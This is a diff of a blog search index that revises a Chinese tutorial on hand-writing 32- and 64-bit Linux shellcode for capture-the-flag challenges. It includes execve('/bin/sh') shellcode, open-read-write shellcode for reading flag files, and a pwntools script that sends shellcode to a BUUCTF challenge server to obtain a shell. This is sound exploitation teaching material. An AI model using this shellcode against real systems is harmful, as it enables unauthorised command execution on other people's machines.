@@ -6371,71 +6371,76 @@
   <entry>
     <title>用汇编语言构造简单的shellcode（64位&amp;&amp;32位）以及将汇编语言转换成机器码的方法</title>
     <url>/posts/5062ac9d.html</url>
-    <content><![CDATA[<h1 id="1、什么是shellcode"><a href="#1、什么是shellcode" class="headerlink" title="1、什么是shellcode"></a>1、什么是shellcode</h1><p>这里我谈谈自己的理解，shellcode就是一段可执行的机器码，如果可以让CPU从shellcode首字节开始往下执行，那么shellcode执行完毕就会达到编写者想要的目的（shellcode不一定非要是获取shell的机器码），至少初学者先这么理解应该是没什么问题的。</p>
+    <content><![CDATA[<h1 id="1、什么是shellcode"><a href="#1、什么是shellcode" class="headerlink" title="1、什么是shellcode"></a>1、什么是shellcode</h1><p>这里我谈谈自己的理解，<code>shellcode</code> 就是一段可执行的机器码，如果可以让 <code>CPU</code> 从 <code>shellcode</code> 首字节开始往下执行，那么 <code>shellcode</code> 执行完毕就会达到编写者想要的目的（<code>shellcode</code> 不一定非要是获取 <code>shell</code> 的机器码），至少初学者先这么理解应该是没什么问题的。</p>
 <span id="more"></span>
 
 <h1 id="2、怎么用汇编语言构造简单的shellcode-64位"><a href="#2、怎么用汇编语言构造简单的shellcode-64位" class="headerlink" title="2、怎么用汇编语言构造简单的shellcode(64位)"></a>2、怎么用汇编语言构造简单的shellcode(64位)</h1><p>前置知识：</p>
-<p>① 64位寄存器传参的前三个寄存器分别是rdi,rsi,rdx</p>
-<p>②64位系统调用号通过查看linux上的&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h文件就可以获取</p>
-<p>③系统调用号放入rax寄存器，然后syscall就可以执行对应的系统调用函数</p>
+<p>① <code>x86_64</code> 架构中执行系统调用负责传参的前三个寄存器分别是 <code>rdi</code> <code>rsi</code> <code>rdx</code></p>
+<p>②<code>64</code> 位系统调用号通过查看 <code>linux</code> 上的 <code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code> 文件就可以获取</p>
+<p>③系统调用号放入 <code>rax</code> 寄存器，然后 <code>syscall</code> 就可以执行对应的系统调用函数</p>
 <p>​		</p>
 <blockquote>
-<p>   首先我们的<strong>目的是执行execve(“&#x2F;bin&#x2F;sh”,0,0)</strong> 从而获取shell</p>
-<p>   因此，我们需要干三件事情</p>
-<p>   ①因为程序本来是没有这个execve函数的，但是我们现在要凭空给它造一个，因此这里系统调用execve（你可以理解为，执行syscall指令之前将rax装成对应的系统调用号，就可以执行对应的系统调用。</p>
-<p>   ②将第一个参数存入”&#x2F;bin&#x2F;sh”</p>
-<p>   ③将第二个、第三个参.数存入0</p>
+<p>   首先我们的<strong>目的是执行 execve(“&#x2F;bin&#x2F;sh”,0,0)</strong> 从而获取shell</p>
+<p>   因此，需要干三件事情</p>
+<p>   ①因为程序本来是没有这个 execve 函数的，但现在要凭空给它造一个，因此这里系统调用 execve（你可以理解为，执行 syscall 指令之前将 rax 装成对应的系统调用号，就可以执行对应的系统调用。</p>
+<p>   ②将第一个参数控制为字符串 &#x2F;bin&#x2F;sh</p>
+<p>   ③将第二个、第三个参数存入0</p>
 </blockquote>
-<p><strong>我们要做的是在系统调用execve之前，去把需要的参数都存进去。</strong></p>
-<p>xor rdx,rdx</p>
-<p>xor rsi,rsi  #此时去把rsi，rdx两个寄存器都存成0，至于这里为什么不用mov rdx,0和mov rsi,0。</p>
-<p>主要是避免出现00字符来截断，不过话说，据我了解，平常如果是直接读入字符串的话，00也不会产生截断的效果，只有用strcpy这类函数的时候，才考虑00截断。不过那为什么我们平常写shellcode还是要尽量选择xor rsi,rsi而不是mov rsi,0呢，是因为xor rsi,rsi所需要的字节数更少。</p>
-<p>这个具体截断的话，可以参考如下两张图片<br><img src="/../img/aImdexjb53GTHuP.png"></p>
-<p><img src="/../img/ieYVwvDbsuX9qLk.png"></p>
-<p>图片出自<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">CTF中常见的C语言输入函数截断属性总结 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
-<p>接着是准备要把第一个参数存入rdi，以前我一直以为是rdi的写成&#x2F;bin&#x2F;sh对应的ascii码，可是现在才明白，<font color=red>我们只是要把&#x2F;bin&#x2F;sh对应的ascii码的*<u><strong>地址</strong></u>*给rdi即可</font>  传参的时候，要调用的函数会自己去这个地址里找到对应的&#x2F;bin&#x2F;sh。</p>
-<p>因此这步要写成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">push rdi   #此时的rdi是0，要把这个0压入栈顶，当下面把0x68732f2f6e69622f压入栈顶之后，这个0就起到了截断字符串的作用（用来声明，execve的第一个参数字符串到哪结束）</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f2f6e69622f  #现在rdi的值是0x68732f2f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi    #此时参数0x68732f2f6e69622f（即/bin//sh)就存在了栈顶的内存单元中</span><br><span class="line"></span><br><span class="line">lea rdi,[rsp]     #等同于mov rdi,rsp  此时是把**栈顶的地址**&lt;u&gt;*（**一定要注意，是栈顶的地址，就是rsp本身的值（rsp本身就是个地址）***&lt;/u&gt;，赋值给rdi，也就是说此时rdi的值就是参数的地址</span><br></pre></td></tr></table></figure>
+<p><strong>我们要做的是在系统调用 <code>execve</code> 之前，把需要的参数都存到对应的寄存器里。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdx,rdx</span><br><span class="line">xor rsi,rsi</span><br></pre></td></tr></table></figure>
 
-<p>这里我还是想详细说一下，因为当初我在这里迷了很久。<font color=red>rsp的值和rsp的内容是两码事</font>，你<strong>可以把他们理解成c语言中的指针p和*p的关系</strong>。<u>rsp的值，就是栈顶内存单元的地址；rsp的内容，就是栈顶的内存单元中的内容。此时rsp的内容才是0x68732f2f6e69622f，而现在只是把栈顶的地址赋给了rdi的值</u>。</p>
+
+
+<p>上面的代码是要把 <code>rsi</code> <code>rdx</code> 两个寄存器都存成 <code>0</code>，至于这里为什么不用 <code>mov rdx,0</code> 和 <code>mov rsi,0</code> 主要原因有两个</p>
+<ol>
+<li>避免出现 <code>\x00</code> 字符来截断，当然了 <code>\x00</code> 并不是所有情况都会截断函数，只有用 <code>strcpy</code> 这类函数时才会考虑 <code>\x00</code> 截断，具体截断的话，可以参考下面两张图片</li>
+<li><code>xor rsi,rsi</code> 比 <code>mov rsi,0</code> 所需的字节数更少</li>
+</ol>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271203805.png" alt="image-20230926230513064"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271203921.png"></p>
+<p>图片出自<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">Clang裁缝店</a></p>
+<p>接着是将第一个参数存入 <code>rdi</code>，以前我一直以为是 <code>rdi</code> 写成 <code>/bin/sh</code> 对应的 <code>ascii</code> 码，可是踩坑后才明白，<font color=red>我们只是要把&#x2F;bin&#x2F;sh对应的ascii码的 <strong>地址</strong> 给rdi即可</font>  传参的时候，要调用的函数会自己去这个地址里找到对应的&#x2F;bin&#x2F;sh。</p>
+<p>因此这步要写成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">push rdi   #此时的rdi是0，要把这个0压入栈顶，当下面把0x68732f2f6e69622f压入栈顶之后，这个0就起到了截断字符串的作用（用来声明，execve的第一个参数字符串到哪结束）</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f2f6e69622f </span><br><span class="line"></span><br><span class="line">push rdi    #此时参数0x68732f2f6e69622f（即/bin//sh)就存在了栈顶的内存单元中</span><br><span class="line"></span><br><span class="line">lea rdi,[rsp]    </span><br></pre></td></tr></table></figure>
+
 <p>现在也才是我们要的效果，<font color=red>rdi里面装的是&#x2F;bin&#x2F;&#x2F;sh的地址，而非参数本身</font>。</p>
-<p> 这里有两点需要注意：</p>
-<p>①这个0x68732f2f6e69622f是&#x2F;bin&#x2F;&#x2F;sh对应的ascii码。<strong>并且他是倒着存的</strong>，因为asm在把我们写的<strong>汇编语言转换成机器码的时候，会因为小端序的原因将输入的内容给倒过来</strong>。别的机器码我们不用担心，<u>但是我们输入的字符串，需要手动先给倒过来一次，这样等到汇编语言转换成机器码的时候，再倒过来一次，程序处理字符串的时候，就会拿到真正的参数&#x2F;bin&#x2F;&#x2F;sh，而非hs&#x2F;&#x2F;nib&#x2F;</u>。</p>
-<p>②<strong>0x68732f2f6e69622f中间这里出现了两2f(也就是两个&#x2F;)，因为这里要填充够八个字节（64位程序中，一个内存单元就只能装八个字节）</strong></p>
+<p>这里有两点需要注意：</p>
+<p>①这个 <code>0x68732f2f6e69622f</code> 是 <code>/bin//sh</code> 对应的 <code>ascii</code> 码。<strong>并且他是倒着存的</strong>，因为 <code>asm</code> 在把我们写的<strong>汇编语言转换成机器码的时候，会因为小端序的原因将输入的内容给倒过来</strong>。别的机器码我们不用担心，<u>但是我们输入的字符串，需要手动先给倒过来一次，这样等到汇编语言转换成机器码的时候，再倒过来一次，程序处理字符串的时候，就会拿到真正的参数 <code>/bin//sh</code> ，而非 <code>hs//nib/</code></u> 。</p>
+<p>②**<code>0x68732f2f6e69622f</code> 中间这里出现了两 <code>2f</code> (也就是两个 <code>/</code> )，因为这里要填充够八个字节（<code>64</code> 位程序中，一个内存单元就只能装八个字节）**</p>
 <p>为了达到上述的效果，我们还可以这么写。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">push rsp</span><br><span class="line"></span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">push rsp</span><br><span class="line"></span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure>
 
 <p>有好几处内容都变了。</p>
-<p>首先是原本xor rdi,rdi下面的push rdi没了，咦？难道我们不需要去在栈中存入一个零，以来声明字符串的结束么？我们依然需要一个00来去截断字符串，但是此刻你还会发现0x68732f6e69622f中间的两个2f现在就变成了一个2f（此时参数是&#x2F;bin&#x2F;sh） 难道此时不需要去填充够八字节么。是的不需要了，<font color=red>程序发现了我们这个内存单元的内容不够八字节，它会自己帮我们添加一个00上去以来凑齐八字节，并且这个00同时声明了字符串的结束。</font></p>
+<p>首先是原本的 <code>push rdi</code> 没了，咦？难道我们不需要去在栈中存入一个零，以来声明字符串的结束么？我们依然需要一个 <code>\x00</code>来去截断字符串，但是此刻你还会发现 <code>0x68732f6e69622f</code> 中间的两个 <code>2f</code> 现在就变成了一个 <code>2f</code>（此时参数是 <code>/bin/sh</code>） 难道此时不需要去填充够八字节么。是的不需要了，<font color=red>程序发现了我们这个内存单元的内容不够八字节，它会自己帮我们添加一个00上去以来凑齐八字节，并且这个00同时声明了字符串的结束。</font></p>
 <p><strong>因此我们不但不需要push一个0，并且还不用去填充八字节，程序帮我们补的00，正好可以去代替原本应该push的0。（值得一提的是如果我们内存单元只有六个字节，那么程序依然会帮我们补全到八个字节，也就是填充两个字节的00）</strong></p>
-<p>最后的变化就是把原本的lea rdi,[rsp]换成了一个push rsp ;pop rdi<strong>（把rsp的值压入栈顶，也就是把rsp的值存入了栈顶内存单元的内容中，再把栈顶的内存单元的内容弹给rdi的值，也就完成了把rsp的值赋给了rdi的值）</strong><u><strong>（在这里一定要区分清楚值与内容的关系）</strong></u>这样做的好处是什么？这样写的字节更少，原本lea rdi,[rsp]是四个字节<br><img src="/../img/n5Jma4K2OYQ7BXS.png"></p>
-<p>即使换成mov rdi,rsp<br><img src="/../img/w4jVgyLbMYJsPnQ.png"></p>
-<p>也还是三个字节。但是我们为了达到同样的效果，使用push rsp;pop rdi两个指令，一共也才两个字节。<br><img src="/../img/LNjIfuTtpRzWJYc.png"></p>
-<p>因为很多有难度的题目都会限制shellcode的长度，<em>因此我们所选的shellcode，是越短越好。</em></p>
-<p>最后，就是将execve对应的系统调用号放入rax中，然后syscall即可</p>
+<p>最后的变化就是把原本的 <code>lea rdi,[rsp]</code> 换成了一个 <code>push rsp ;pop rdi</code> 这样做的好处是什么？这样写的字节更少，原本 <code>lea rdi,[rsp]</code> 是四个字节<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271203064.png" alt="image-20230926230632118"></p>
+<p>即使换成 <code>mov rdi,rsp</code><br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271203570.png" alt="image-20230926230643732"></p>
+<p>也还是三个字节。但是我们为了达到同样的效果，使用 <code>push rsp;pop rdi</code> 两个指令，一共也才两个字节。<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271203055.png" alt="image-20230926230657025"></p>
+<p>因为很多有难度的题目都会限制 <code>shellcode</code> 的长度，所以所选的 <code>shellcode</code>是越短越好。</p>
+<p>最后将 <code>execve</code> 对应的系统调用号放入 <code>rax</code> 中，执行 <code>syscall</code> 即可</p>
 <p>那剩下的汇编就是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line"></span><br><span class="line">mov rax,0x3b</span><br><span class="line"></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,0x3b</span><br><span class="line"></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
 
 
-<p>然后把刚才所写的三部分汇总一下并且精简一下最后仅仅用了0x1e个字节。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>然后把刚才所写的三部分汇总一下并且精简一下最后仅仅用了 <code>0x12</code> 个字节。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi ,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/TNoUnRDAEt1FYai.png"></p>
-<p>此时只要执行这个shellcode，就可以去拿到shell了。</p>
-<p><strong>注意:</strong> 由于压入参数&#x2F;bin&#x2F;sh的时候最后一个默认补了00，导致碰见memcpy等函数shellcode会被截断，这里可以用&#x2F;bin&#x2F;&#x2F;sh来代替，更新过的shellcode如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f2f6e69622f</span><br><span class="line">xor rsi,rsi</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271209386.png" alt="image-20230926230734484"></p>
+<p>此时只要执行这个 <code>shellcode</code> 就可以去拿到 <code>shell</code> 了</p>
+<p><strong>注意:</strong> 由于压入参数 <code>/bin/sh</code> 的时候最后一个默认补了 <code>\x00</code>，导致碰见 <code>memcpy</code> 等函数 <code>shellcode</code> 会被截断，这里可以用 <code>/bin//sh</code> 来代替，更新过的 <code>shellcode</code> 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi ,0x68732f2f6e69622f</span><br><span class="line">xor rsi,rsi</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
 
 
 
-<p>这里拿一道BUUCTF上的mrctf2020_shellcode来演示一下</p>
-<p>使用IDA分析之后（这道题无法F5，不过可以看汇编来分析），发现我们输入的内容直接就被执行了，因此什么都不用考虑，这道题仅仅就是考察我们64位汇编编写shellcode的能力。利用pwntools中的asm把刚才写好的汇编内容转换成机器码，然后发送过去即可获取shell。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27143</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里拿一道 BUUCTF 上的 mrctf2020_shellcode 来演示一下</p>
+<p>使用 <code>IDA</code> 分析之后（这道题无法 <code>F5</code> ，不过可以看汇编来分析），发现我们输入的内容直接就被执行了，因此什么都不用考虑，这道题仅仅就是考察我们 <code>64</code> 位汇编编写 <code>shellcode</code> 的能力。利用 <code>pwntools</code> 中的 <code>asm</code> 把刚才写好的汇编内容转换成机器码，然后发送过去即可获取 <code>shell</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27143</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="3、怎么用汇编语言构造简单的shellcode（32位）"><a href="#3、怎么用汇编语言构造简单的shellcode（32位）" class="headerlink" title="3、怎么用汇编语言构造简单的shellcode（32位）"></a>3、怎么用汇编语言构造简单的shellcode（32位）</h1><p>前置知识：</p>
-<p>①对于32位程序而言，我们最后系统调用采用的并不是syscall，而是int 0x80</p>
-<p>②我们传参的前三个寄存器分别是ebx,ecx,edx</p>
-<p>③32位的execve系统调用号是11，并且存储系统调用后的寄存器是eax。32位的系统调用号可以查看这个文件&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h</p>
-<p>然后剩下的思路是和64位汇编构造shellcode的思路是一样的。</p>
+<p>①对于 <code>32</code> 位程序而言，我们最后系统调用采用的并不是 <code>syscall</code>，而是 <code>int 0x80</code></p>
+<p>②我们传参的前三个寄存器分别是 <code>ebx</code> <code>ecx</code> <code>edx</code></p>
+<p>③<code>32</code> 位的 <code>execve</code> 系统调用号是 <code>11</code> ，并且存储系统调用后的寄存器是 <code>eax</code>。<code>32</code> 位的系统调用号可以查看这个文件 <code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code></p>
+<p>然后剩下的思路是和 <code>64</code> 位汇编构造 <code>shellcode</code> 的思路是一样的。</p>
 <p>首先是</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br></pre></td></tr></table></figure>
 
@@ -6444,46 +6449,46 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br></pre></td></tr></table></figure>
 
 <p>此时把参数&#x2F;bin&#x2F;sh压入栈，最开始push ebx是先压入栈中一个0，用来字符串截断。最后将esp指向的地址赋给了ebx，此时ebx的值就是&#x2F;bin&#x2F;sh的地址。</p>
-<p><img src="/../img/HwopUbyABF6SDzc.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271210184.png" alt="image-20230926230802945"></p>
 <p>此时栈中的情况就是这样，&#x2F;bin&#x2F;sh与&#x2F;bin&#x2F;&#x2F;sh的效果一样，至于为什么要存入字符串的时候，要反着写，在64位汇编编写shellcode的时候，已经解释过了，这里就不再重复。</p>
 <p>最后是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
 
 <p>现在是把系统调用号存进去并且进行了系统调用</p>
 <p>最后把这三部分结合一下效果如下。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
 
-<h1 id="4、手写open，read，write的shellcode"><a href="#4、手写open，read，write的shellcode" class="headerlink" title="4、手写open，read，write的shellcode"></a>4、手写open，read，write的shellcode</h1><p>遇见pwn题开启了沙箱保护的话，如果禁用了execve、system函数，但没有开启NX保护的话，可以采用orw的方式来读出flag。</p>
+<h1 id="4、手写open，read，write的shellcode"><a href="#4、手写open，read，write的shellcode" class="headerlink" title="4、手写open，read，write的shellcode"></a>4、手写open，read，write的shellcode</h1><p>遇见 <code>pwn</code> 题开启了沙箱保护的话，如果禁用了 <code>execve</code> <code>system</code> 函数，但没有开启 <code>NX</code> 保护的话，可以采用 <code>orw</code> 的方式来读出 <code>flag</code></p>
 <p>首先我们要执行的如下的代码：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)<span class="comment">#第一个参数是3，因为一个进程有默认的文件描述符0,1,2。当再打开新的文件之后，文件描述符就会以此类推的分配，因此上面open新打开的flag文件的文件描述符就是3</span></span><br><span class="line"><span class="comment">#至于这个addr，把读出来的flag放到哪，一会再说</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure>
 
-<p>接下来，就开始用汇编来实现上面的内容(先写64位的)。</p>
+<p>接下来，就开始用汇编来实现上面的内容(先写 <code>64</code> 位的)。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串&#x27;flag&#x27;</span><br><span class="line">#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，</span><br><span class="line">#此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi</span><br><span class="line">#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(3,addr,0x50)</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个栈地址具体是多少</span><br><span class="line">#只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址具体是什么并不重要（只要不会导致堆栈崩溃的话）</span><br><span class="line">#重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的</span><br><span class="line">#每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(1,addr,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">#这个地方的push rsp pop rsi原理同上</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>接下来是32位的，32位和64位编写的区别主要是<strong>寄存器不同</strong>和<strong>系统调用号不同</strong>，另外就是<strong>再压入参数’flag’的时候，32位的需要提前压入00用来截断字符串</strong>（64位不需要push 0的原因是存入的’flag’不足8字节，会自动添加00来截断）</p>
+<p>接下来是 <code>32</code> 位的 <code>shellcode</code>，<code>32</code> 位和 <code>64</code> 位编写的区别主要是<strong>寄存器不同</strong>和<strong>系统调用号不同</strong>，另外就是<strong>再压入参数’flag’的时候，32位的需要提前压入00用来截断字符串</strong>（ <code>64</code> 位不需要 <code>push 0</code> 的原因是存入的 <code>flag</code> 不足 <code>8</code> 字节，会自动添加 <code>\x00</code> 来截断）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
 
-<h1 id="5、如何调试或测试写好的汇编代码？"><a href="#5、如何调试或测试写好的汇编代码？" class="headerlink" title="5、如何调试或测试写好的汇编代码？"></a>5、如何调试或测试写好的汇编代码？</h1><p>因为在编写shellcode的时候，并不是一帆风顺的，如果出现了错误只靠眼睛看的话效果不大，因此我们可以把汇编代码编译为可执行文件，用gdb来调试。</p>
-<p>先用touch shellcode.asm  命令创建一个shellcode.asm文件(asm文件是使用汇编语言编写的源代码文件)</p>
-<p>然后vim shellcode.asm  去编辑这个文件</p>
-<p>将汇编的内容写入这个文件里面。</p>
+<h1 id="5、如何调试或测试写好的汇编代码？"><a href="#5、如何调试或测试写好的汇编代码？" class="headerlink" title="5、如何调试或测试写好的汇编代码？"></a>5、如何调试或测试写好的汇编代码？</h1><p>因为在编写 <code>shellcode</code> 的时候并不是一帆风顺的，如果出现了错误只靠眼睛检查的话 效果不大，因此我们可以把汇编代码编译为可执行文件，用<code>gdb</code> 来调试。</p>
+<p>先用 <code>touch shellcode.asm</code>  命令创建一个 <code>shellcode.asm</code> 文件(<code>asm</code> 文件是使用汇编语言编写的源代码文件)</p>
+<p>然后 <code>vim shellcode.asm</code> 去编辑这个文件</p>
+<p>将汇编的内容写入这个文件里面</p>
